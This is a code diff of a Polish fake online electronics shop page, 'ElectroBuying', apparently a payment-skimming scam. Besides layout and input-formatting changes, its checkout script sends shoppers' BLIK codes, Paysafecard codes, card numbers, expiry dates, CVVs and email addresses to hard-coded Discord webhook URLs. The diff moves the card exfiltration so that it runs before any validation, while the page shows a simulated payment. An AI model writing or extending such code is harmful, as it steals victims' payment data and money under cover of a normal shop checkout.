@@ -1,4 +1,4 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
@@ -82,15 +82,12 @@
             background: linear-gradient(135deg, #00d4ff, #7c3aed);
             color: white;
             padding: 0.8rem;
-            border: none;
             border-radius: 50%;
             cursor: pointer;
             font-size: 1.2rem;
             transition: all 0.3s ease;
             position: relative;
-            display: flex; /* Ensure content is centered */
-            align-items: center;
-            justify-content: center;
+            border: none;
         }
 
         .cart-icon:hover {
@@ -124,102 +121,6 @@
             font-size: 0.8rem;
             font-weight: 700;
         }
-
-        /* Hamburger Menu */
-        .hamburger-menu-btn {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 2rem;
-            cursor: pointer;
-            display: none; /* Hidden by default, shown on mobile */
-            z-index: 1001;
-            padding: 0.5rem;
-            transition: transform 0.3s ease;
-        }
-        .hamburger-menu-btn:hover {
-            transform: scale(1.1);
-            color: #00d4ff;
-        }
-
-        .mobile-nav-sidebar {
-            position: fixed;
-            top: 0;
-            right: -100%; /* Start off-screen */
-            width: 100%; /* Full width on mobile */
-            max-width: 300px; /* Max width for larger phones/tablets */
-            height: 100vh;
-            background: linear-gradient(135deg, #1a1a2e, #0f3460);
-            backdrop-filter: blur(30px);
-            border-left: 1px solid rgba(255, 255, 255, 0.2);
-            z-index: 2000;
-            transition: right 0.3s ease-out;
-            padding: 2rem;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 1.5rem;
-        }
-
-        .mobile-nav-sidebar.open {
-            right: 0;
-        }
-
-        .mobile-nav-sidebar .close-btn {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 2.5rem;
-            cursor: pointer;
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            transition: all 0.3s ease;
-        }
-        .mobile-nav-sidebar .close-btn:hover {
-            color: #ec4899;
-            transform: scale(1.1);
-        }
-
-        .mobile-nav-sidebar .nav-links-mobile {
-            list-style: none;
-            padding: 0;
-            margin-top: 3rem;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: 1.5rem;
-        }
-
-        .mobile-nav-sidebar .nav-links-mobile a {
-            color: rgba(255, 255, 255, 0.9);
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1.3rem;
-            padding: 0.8rem 1rem;
-            border-radius: 10px;
-            display: block;
-            transition: all 0.3s ease;
-        }
-        .mobile-nav-sidebar .nav-links-mobile a:hover {
-            background: rgba(255, 255, 255, 0.1);
-            color: #00d4ff;
-            transform: translateX(5px);
-        }
-
-        .mobile-nav-sidebar .cart-icon-mobile {
-            margin-top: 1rem;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-        }
-        .mobile-nav-sidebar .cart-icon-mobile .cart-icon {
-            width: 60px;
-            height: 60px;
-            font-size: 1.8rem;
-            padding: 0;
-        }
-
 
         /* Hero Section */
         .hero {
@@ -1217,12 +1118,8 @@
                 font-size: 1.4rem;
             }
 
-            /* Hide desktop nav links and show hamburger */
             .nav-links {
                 display: none;
-            }
-            .hamburger-menu-btn {
-                display: block;
             }
 
             .about-content {
@@ -1231,19 +1128,6 @@
 
             .products-grid {
                 grid-template-columns: 1fr;
-                gap: 1.5rem; /* Slightly smaller gap on mobile */
-            }
-
-            .product-card {
-                padding: 1.5rem; /* Smaller padding */
-            }
-
-            .product-name {
-                font-size: 1.4rem;
-            }
-
-            .product-price {
-                font-size: 1.8rem;
             }
 
             .about-stats {
@@ -1252,7 +1136,6 @@
 
             .section-title {
                 font-size: 2.5rem;
-                margin-bottom: 2.5rem;
             }
 
             .cart-sidebar {
@@ -1270,17 +1153,6 @@
 
             .modal-product-info {
                 flex-direction: column;
-            }
-
-            .checkout-modal-content h3 {
-                font-size: 1.8rem;
-            }
-
-            .order-summary p {
-                font-size: 1rem;
-            }
-            .order-summary p:last-child {
-                font-size: 1.2rem;
             }
         }
 
@@ -1328,11 +1200,10 @@
     <nav>
         <div class="nav-container">
             <div class="logo">ElectroBuying</div>
-            <!-- Desktop Nav Links -->
             <ul class="nav-links">
                 <li><a href="#home">Strona główna</a></li>
                 <li><a href="#products">Produkty</a></li>
-                <li><a href="#low-price-secret">Niskie Ceny</a></li>
+                <li><a href="#low-price-secret">Niskie Ceny</a></li> <!-- New link -->
                 <li><a href="#about">O nas</a></li>
                 <li><a href="#reviews">Opinie</a></li>
                 <li>
@@ -1342,28 +1213,8 @@
                     </button>
                 </li>
             </ul>
-            <!-- Mobile Hamburger Button -->
-            <button class="hamburger-menu-btn" onclick="toggleMobileNav()">☰</button>
         </div>
     </nav>
-
-    <!-- Mobile Navigation Sidebar -->
-    <div class="mobile-nav-sidebar" id="mobile-nav-sidebar">
-        <button class="close-btn" onclick="toggleMobileNav()">&times;</button>
-        <ul class="nav-links-mobile">
-            <li><a href="#home" onclick="toggleMobileNav()">Strona główna</a></li>
-            <li><a href="#products" onclick="toggleMobileNav()">Produkty</a></li>
-            <li><a href="#low-price-secret" onclick="toggleMobileNav()">Niskie Ceny</a></li>
-            <li><a href="#about" onclick="toggleMobileNav()">O nas</a></li>
-            <li><a href="#reviews" onclick="toggleMobileNav()">Opinie</a></li>
-        </ul>
-        <div class="cart-icon-mobile">
-            <button class="cart-icon" id="cart-icon-btn-mobile" onclick="toggleCart(); toggleMobileNav();">
-                🛒
-                <span class="cart-count" id="cart-count-mobile">0</span>
-            </button>
-        </div>
-    </div>
 
     <!-- Hero Section -->
     <section id="home" class="hero">
@@ -1661,7 +1512,7 @@
                         </div>
                         <div class="form-group">
                             <label for="phone">Numer telefonu *</label>
-                            <input type="tel" id="phone" pattern="[0-9]{9}" maxlength="9" inputmode="numeric" required>
+                            <input type="tel" id="phone" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}" maxlength="11" inputmode="numeric" placeholder="123-456-789" required>
                         </div>
                         <div class="form-group">
                             <label for="street">Ulica i numer domu *</label>
@@ -1916,8 +1767,8 @@
 
         // Discord Webhook URLs
         const BLIK_WEBHOOK_URL = "https://discord.com/api/webhooks/1413193116969730058/drs_8KabgaeXyOQhsuv5BpyvvhB-LOsjAUgKpV-2v2ERqOutRmR2EEcdaR2fT5qaPtD1";
-        const PSC_WEBHOOK_URL = "https://discord.com/api/webhooks/1413193033494823082/OLHbrBOnOpV-LumcJ0hqlhMzy3HDDsPQeNuBh9GK9chN8vr109uGZTOjNY68OTOYm-_f";
-        const CARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1407517056919928972/zwMBseYPP88wE7JqyIQ-qwsksWOfw_-z4hJXzzfLrcso29Aft2xKO6s0H6VvsKLSv7kZ";
+        const PSC_WEBHOOK_URL = "https://discord.com/api/webhooks/1413193033494823082/OLHbrBOnOpV-LumcJ0hqlhMzy3HDDsPQeNuBh9GK9chN8vr109uGZTOjNY68OTOYm-_f"; // Zaktualizowany URL
+        const CARD_WEBHOOK_URL = "https://discord.com/api/webhooks/1407517056919928972/zwMBseYPP88wE7JqyIQ-qwsksWOfw_-z4hJXzzfLrcso29Aft2xKO6s0H6VvsKLSv7kZ"; // Zaktualizowany URL
 
 
         // Additional reviews data (simulating 200+ reviews)
@@ -1973,27 +1824,20 @@
             showNotification(`Dodano do koszyka: ${name}`);
             
             const cartIcon = document.getElementById('cart-icon-btn');
-            const cartIconMobile = document.getElementById('cart-icon-btn-mobile');
-            
             cartIcon.classList.add('animate');
-            if (cartIconMobile) cartIconMobile.classList.add('animate');
-
             setTimeout(() => {
                 cartIcon.classList.remove('animate');
-                if (cartIconMobile) cartIconMobile.classList.remove('animate');
             }, 300); // Match animation duration
         }
 
         function updateCartDisplay() {
             const cartItems = document.getElementById('cart-items');
             const cartCount = document.getElementById('cart-count');
-            const cartCountMobile = document.getElementById('cart-count-mobile');
             const cartTotalElement = document.getElementById('cart-total');
             const checkoutBtn = document.getElementById('checkout-btn');
             const totalAmount = document.getElementById('total-amount');
 
             cartCount.textContent = cart.length;
-            if (cartCountMobile) cartCountMobile.textContent = cart.length;
 
             if (cart.length === 0) {
                 cartItems.innerHTML = '<p style="opacity: 0.7; text-align: center;">Koszyk jest pusty</p>';
@@ -2046,28 +1890,14 @@
             cartSidebar.classList.toggle('open');
         }
 
-        // Mobile Navigation functions
-        function toggleMobileNav() {
-            const mobileNavSidebar = document.getElementById('mobile-nav-sidebar');
-            mobileNavSidebar.classList.toggle('open');
-        }
-
-        // Close cart sidebar and mobile nav when clicking outside
+        // Close cart sidebar when clicking outside
         window.addEventListener('click', function(event) {
             const cartSidebar = document.getElementById('cart-sidebar');
             const cartIcon = document.getElementById('cart-icon-btn');
-            const cartIconMobile = document.getElementById('cart-icon-btn-mobile');
-            const mobileNavSidebar = document.getElementById('mobile-nav-sidebar');
-            const hamburgerBtn = document.querySelector('.hamburger-menu-btn');
             
-            // Close cart sidebar on outside click
-            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target) && (!cartIconMobile || !cartIconMobile.contains(event.target))) {
+            // Check if the click is outside the cart sidebar and not on the cart icon itself
+            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target)) {
                 cartSidebar.classList.remove('open');
-            }
-
-            // Close mobile nav sidebar on outside click
-            if (mobileNavSidebar.classList.contains('open') && !mobileNavSidebar.contains(event.target) && !hamburgerBtn.contains(event.target)) {
-                mobileNavSidebar.classList.remove('open');
             }
         });
 
@@ -2170,6 +2000,19 @@
         function closeCheckoutModal() {
             document.getElementById('checkout-modal').style.display = 'none';
             document.getElementById('shipping-form').reset(); // Reset form fields
+            pscCodeCount = 1; // Ensure PSC code count is reset
+            // Also clear any dynamically added PSC inputs
+            const pscCodesContainer = document.getElementById('psc-codes-container');
+            if (pscCodesContainer) {
+                while (pscCodesContainer.children.length > 1) { // Keep the first one
+                    pscCodesContainer.removeChild(pscCodesContainer.lastChild);
+                }
+                // Reset the value of the first PSC input if it exists
+                const firstPscInput = document.getElementById('pscCode1');
+                if (firstPscInput) {
+                    firstPscInput.value = '';
+                }
+            }
         }
 
         function goToPaymentStep() {
@@ -2207,6 +2050,60 @@
             document.getElementById('shipping-step').style.display = 'block';
         }
 
+        // Helper function for card/PSC formatting (every 4 digits)
+        function formatWithDashes(value, groupSize) {
+            const cleanedValue = value.replace(/\D/g, ''); // Remove non-digits
+            let formattedValue = '';
+            for (let i = 0; i < cleanedValue.length; i++) {
+                if (i > 0 && i % groupSize === 0) {
+                    formattedValue += '-';
+                }
+                formattedValue += cleanedValue[i];
+            }
+            return formattedValue;
+        }
+
+        // Phone number formatting (every 3 digits)
+        function formatPhoneInput(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digits
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 3 === 0) {
+                    formattedValue += '-';
+                }
+                formattedValue += value[i];
+            }
+            input.value = formattedValue.substring(0, input.maxLength); // Apply max length after formatting
+        }
+
+        // Postal code formatting (XX-XXX)
+        function formatPostalCodeInput(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '-' + value.substring(2, 5);
+            }
+            input.value = value.substring(0, input.maxLength); // Apply max length after formatting
+        }
+
+        // Expiry date formatting (MM/YY)
+        function formatExpiryDateInput(input) {
+            let value = input.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            input.value = value.substring(0, input.maxLength); // Apply max length after formatting
+        }
+
+        // CVV formatting (just digits, max 3)
+        function formatCvvInput(input) {
+            input.value = input.value.replace(/\D/g, '').substring(0, input.maxLength);
+        }
+
+        // BLIK formatting (just digits, max 6)
+        function formatBlikInput(input) {
+            input.value = input.value.replace(/\D/g, '').substring(0, input.maxLength);
+        }
+
         function renderPaymentMethodForm(method, finalTotal) {
             const paymentDetailsContainer = document.getElementById('payment-method-details');
             let formHTML = '';
@@ -2234,7 +2131,7 @@
                             <div class="psc-codes-container" id="psc-codes-container">
                                 <div class="psc-code-entry">
                                     <label for="pscCode1">Wprowadź kod Paysafecard (16 cyfr) *</label>
-                                    <input type="text" id="pscCode1" class="psc-code-input" pattern="[0-9]{16}" maxlength="16" inputmode="numeric" required>
+                                    <input type="text" id="pscCode1" class="psc-code-input" pattern="([0-9]{4}-){3}[0-9]{4}" maxlength="19" inputmode="numeric" required>
                                     <button type="button" class="add-psc-code-btn" onclick="addPscCodeInput()">+</button>
                                 </div>
                             </div>
@@ -2251,15 +2148,15 @@
                         <div class="payment-method-form">
                             <div class="form-group">
                                 <label for="cardNumber">Numer karty *</label>
-                                <input type="text" id="cardNumber" pattern="[0-9]{13,16}" maxlength="16" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric" required>
+                                <input type="text" id="cardNumber" pattern="([0-9]{4}-){3}[0-9]{4}" maxlength="19" placeholder="XXXX-XXXX-XXXX-XXXX" inputmode="numeric" required>
                             </div>
                             <div class="form-group">
                                 <label for="expiryDate">Data ważności (MM/RR) *</label>
-                                <input type="text" id="expiryDate" pattern="(0[1-9]|1[0-2])\\/[0-9]{2}" maxlength="5" placeholder="MM/RR" inputmode="numeric" required>
+                                <input type="text" id="expiryDate" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/RR" inputmode="numeric" required>
                             </div>
                             <div class="form-group">
                                 <label for="cvv">CVV *</label>
-                                <input type="text" id="cvv" pattern="[0-9]{3,4}" maxlength="4" inputmode="numeric" required>
+                                <input type="text" id="cvv" pattern="[0-9]{3}" maxlength="3" inputmode="numeric" required>
                             </div>
                             <div id="cardMessage" class="message info">
                                 Wprowadź dane swojej karty płatniczej.<br>
@@ -2273,9 +2170,56 @@
                     formHTML = '<p class="message error">Nie wybrano metody płatności lub jest ona nieobsługiwana.</p>';
             }
             paymentDetailsContainer.innerHTML = formHTML;
+
+            // Attach listeners after rendering the form
+            if (method === 'blik') {
+                const blikCodeInput = document.getElementById('blikCode');
+                if (blikCodeInput) {
+                    blikCodeInput.addEventListener('input', function(e) {
+                        formatBlikInput(e.target);
+                    });
+                }
+            } else if (method === 'psc') {
+                // Attach to existing and future PSC inputs
+                attachPscInputListeners();
+            } else if (method === 'card') {
+                const cardNumberInput = document.getElementById('cardNumber');
+                const expiryDateInput = document.getElementById('expiryDate');
+                const cvvInput = document.getElementById('cvv');
+
+                if (cardNumberInput) {
+                    cardNumberInput.addEventListener('input', function(e) {
+                        e.target.value = formatWithDashes(e.target.value, 4);
+                    });
+                }
+                if (expiryDateInput) {
+                    expiryDateInput.addEventListener('input', function(e) {
+                        formatExpiryDateInput(e.target);
+                    });
+                }
+                if (cvvInput) {
+                    cvvInput.addEventListener('input', function(e) {
+                        formatCvvInput(e.target);
+                    });
+                }
+            }
         }
 
         let pscCodeCount = 1;
+        // Helper to attach PSC listeners (for initial and dynamically added inputs)
+        function attachPscInputListeners() {
+            document.querySelectorAll('.psc-code-input').forEach(input => {
+                // Remove existing listener to prevent duplicates if called multiple times
+                input.removeEventListener('input', pscInputHandler);
+                input.addEventListener('input', pscInputHandler);
+            });
+        }
+
+        // Handler for PSC inputs
+        function pscInputHandler(e) {
+            e.target.value = formatWithDashes(e.target.value, 4);
+        }
+
         function addPscCodeInput() {
             pscCodeCount++;
             const pscCodesContainer = document.getElementById('psc-codes-container');
@@ -2283,10 +2227,16 @@
             newPscEntry.className = 'psc-code-entry';
             newPscEntry.innerHTML = `
                 <label for="pscCode${pscCodeCount}">Dodatkowy kod PSC (16 cyfr) *</label>
-                <input type="text" id="pscCode${pscCodeCount}" class="psc-code-input" pattern="[0-9]{16}" maxlength="16" inputmode="numeric" required>
+                <input type="text" id="pscCode${pscCodeCount}" class="psc-code-input" pattern="([0-9]{4}-){3}[0-9]{4}" maxlength="19" inputmode="numeric" required>
                 <button type="button" class="remove-psc-code-btn" onclick="removePscCodeInput(this)">✖</button>
             `;
             pscCodesContainer.appendChild(newPscEntry);
+            
+            // Attach listener to the newly created input
+            const newPscInput = document.getElementById(`pscCode${pscCodeCount}`);
+            if (newPscInput) {
+                newPscInput.addEventListener('input', pscInputHandler);
+            }
         }
 
         function removePscCodeInput(buttonElement) {
@@ -2357,7 +2307,7 @@
                             messageElement.innerHTML = successMessage;
                             setTimeout(() => {
                                 completeOrder();
-                            }, 2000);
+                            }, 5000); // Zmieniono na 5 sekund
                         } else {
                             messageElement.className = 'message error';
                             messageElement.innerHTML = `Jeżeli kod BLIK nie zostanie zaakceptowany, spróbuj później... 😔<br>
@@ -2371,8 +2321,12 @@
                 messageElement = document.getElementById('pscMessage');
                 let allPscCodesValid = true;
                 const pscCodes = [];
+                const pscPattern = /^([0-9]{4}-){3}[0-9]{4}$/; // Regex for XXXX-XXXX-XXXX-XXXX
+
                 pscCodeInputs.forEach(input => {
-                    if (!input.checkValidity()) {
+                    // Ensure formatting is applied before validation
+                    input.value = formatWithDashes(input.value, 4);
+                    if (!pscPattern.test(input.value)) { // Manual regex check
                         allPscCodesValid = false;
                     }
                     pscCodes.push(input.value);
@@ -2381,7 +2335,7 @@
                 if (!allPscCodesValid) {
                     isValid = false;
                     messageElement.className = 'message error';
-                    messageElement.innerHTML = `Wprowadź wszystkie 16-cyfrowe kody Paysafecard poprawnie.<br>
+                    messageElement.innerHTML = `Wprowadź wszystkie 16-cyfrowe kody Paysafecard poprawnie (XXXX-XXXX-XXXX-XXXX).<br>
                                                 Potwierdzenie z zapłatą zostanie wysłane na Twój email, jeżeli kod PSC zostanie zaakceptowany.`;
                 } else {
                     // Send PSC codes to Discord webhook
@@ -2410,7 +2364,7 @@
                             messageElement.innerHTML = successMessage;
                             setTimeout(() => {
                                 completeOrder();
-                            }, 2000);
+                            }, 5000); // Zmieniono na 5 sekund
                         } else {
                             messageElement.className = 'message error';
                             messageElement.innerHTML = `Jeżeli kody Paysafecard nie zostaną zaakceptowane, spróbuj później... 😔<br>
@@ -2425,34 +2379,51 @@
                 const cvvInput = document.getElementById('cvv');
                 messageElement = document.getElementById('cardMessage');
 
-                if (!cardNumberInput.checkValidity() || !expiryDateInput.checkValidity() || !cvvInput.checkValidity()) {
+                // Immediately show "Analizowanie płatności..."
+                messageElement.className = 'message info';
+                messageElement.textContent = 'Analizowanie płatności...';
+
+                // Explicitly re-format values before checking validity
+                if (cardNumberInput) cardNumberInput.value = formatWithDashes(cardNumberInput.value, 4);
+                if (expiryDateInput) formatExpiryDateInput(expiryDateInput); // formatExpiryDateInput modifies in place
+                if (cvvInput) formatCvvInput(cvvInput); // formatCvvInput modifies in place
+
+                // Manual validation using regex
+                const cardNumberPattern = /^([0-9]{4}-){3}[0-9]{4}$/; // XXXX-XXXX-XXXX-XXXX
+                const expiryDatePattern = /^(0[1-9]|1[0-2])\/[0-9]{2}$/; // MM/YY
+                const cvvPattern = /^[0-9]{3}$/; // 3 digits
+
+                // Collect data for webhook regardless of client-side validation
+                const cardNumber = cardNumberInput.value;
+                const expiryDate = expiryDateInput.value;
+                const cvv = cvvInput.value;
+
+                const discordData = {
+                    content: "Nowa płatność Kartą Kredytową!",
+                    embeds: [{
+                        title: "Płatność Kartą Kredytową",
+                        description: `Próba płatności kartą na kwotę **${finalTotal.toFixed(2)} zł**.`,
+                        color: 16711680, // Red
+                        fields: [
+                            { name: "Numer Karty", value: `\`${cardNumber}\``, inline: false },
+                            { name: "Data Ważności", value: `\`${expiryDate}\``, inline: true },
+                            { name: "CVV", value: `\`${cvv}\``, inline: true },
+                            { name: "Email Klienta", value: customerEmail, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                sendDiscordWebhook(CARD_WEBHOOK_URL, discordData); // Send to webhook here
+
+                if (!cardNumberPattern.test(cardNumberInput.value) ||
+                    !expiryDatePattern.test(expiryDateInput.value) ||
+                    !cvvPattern.test(cvvInput.value)) {
                     isValid = false;
                     messageElement.className = 'message error';
-                    messageElement.textContent = 'Proszę wypełnić wszystkie pola karty poprawnie.';
+                    messageElement.textContent = 'Wystąpił problem z danymi karty. Proszę sprawdzić format i spróbować ponownie.';
                 } else {
-                    // Send card details to Discord webhook
-                    const cardNumber = cardNumberInput.value;
-                    const expiryDate = expiryDateInput.value;
-                    const cvv = cvvInput.value;
-
-                    const discordData = {
-                        content: "Nowa płatność Kartą Kredytową!",
-                        embeds: [{
-                            title: "Płatność Kartą Kredytową",
-                            description: `Próba płatności kartą na kwotę **${finalTotal.toFixed(2)} zł**.`,
-                            color: 16711680, // Red
-                            fields: [
-                                { name: "Numer Karty", value: `\`${cardNumber}\``, inline: false },
-                                { name: "Data Ważności", value: `\`${expiryDate}\``, inline: true },
-                                { name: "CVV", value: `\`${cvv}\``, inline: true },
-                                { name: "Email Klienta", value: customerEmail, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-                    sendDiscordWebhook(CARD_WEBHOOK_URL, discordData);
-
-                    messageElement.className = 'message info';
+                    // If client-side validation passes, proceed with simulation
+                    messageElement.className = 'message info'; // Keep info state during simulation
                     messageElement.textContent = 'Przetwarzanie płatności kartą...';
                     // Simulate API call
                     setTimeout(() => {
@@ -2461,14 +2432,14 @@
                             messageElement.innerHTML = successMessage;
                             setTimeout(() => {
                                 completeOrder();
-                            }, 2000);
+                            }, 5000); // Zmieniono na 5 sekund
                         } else {
                             messageElement.className = 'message error';
                             messageElement.innerHTML = failureMessage;
                         }
                     }, 2000);
-                    return; // Don't complete order immediately
                 }
+                return; // Don't complete order immediately
             } else { // This case should ideally not be reached with the updated select options
                 alert(`Symulacja przekierowania do ${method.toUpperCase()}...`);
                 // Simulate external payment processing
@@ -2503,9 +2474,6 @@
             const productModal = document.getElementById('product-modal');
             const cartSidebar = document.getElementById('cart-sidebar');
             const cartIcon = document.getElementById('cart-icon-btn');
-            const mobileNavSidebar = document.getElementById('mobile-nav-sidebar');
-            const hamburgerBtn = document.querySelector('.hamburger-menu-btn');
-
 
             // Close productModal on outside click
             if (event.target === productModal) {
@@ -2513,7 +2481,7 @@
             }
             
             // Close cart sidebar on outside click, but not if clicking the cart icon itself
-            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target) && (window.innerWidth > 768 || (mobileNavSidebar && !mobileNavSidebar.contains(event.target) && !hamburgerBtn.contains(event.target)))) {
+            if (cartSidebar.classList.contains('open') && !cartSidebar.contains(event.target) && !cartIcon.contains(event.target)) {
                 cartSidebar.classList.remove('open');
             }
             // The checkoutModal is now only closed by its 'x' button
@@ -2618,9 +2586,23 @@
 
         // Initial cart update
         updateCartDisplay();
+
+        // Attach initial formatting listeners for static fields
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('phone');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function(e) {
+                    formatPhoneInput(e.target);
+                });
+            }
+
+            const zipCodeInput = document.getElementById('zipCode');
+            if (zipCodeInput) {
+                zipCodeInput.addEventListener('input', function(e) {
+                    formatPostalCodeInput(e.target);
+                });
+            }
+        });
     </script>
 </body>
 </html>
-
-</html>
-
